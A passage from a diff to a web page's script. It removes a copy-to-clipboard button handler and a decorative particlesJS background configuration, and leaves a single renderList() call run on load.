-    if (!code || code.startsWith('--')) return;
-    navigator.clipboard.writeText(code).then(() => {
-        const btn = document.getElementById('copyBtn');
-        btn.textContent = '✓ Copied!';
-        btn.classList.add('ok');
-        setTimeout(() => { btn.textContent = '⧉ Copy'; btn.classList.remove('ok'); }, 2000);
-    });
-}
-particlesJS("particles-js", {
-  "particles": {
-    "number": { "value": 80, "density": { "enable": true, "value_area": 800 } },
-    "color": { "value": "#ffffff" },
-    "opacity": { "value": 0.5, "random": true },
-    "size": { "value": 2, "random": true },
-    "line_linked": { "enable": false },
-    "move": { "enable": true, "speed": 1, "direction": "bottom", "random": true }
-  }
-
-renderList();
+    // Initialize list on load
+    renderList();
 </script>
+
 </body>
 </html>
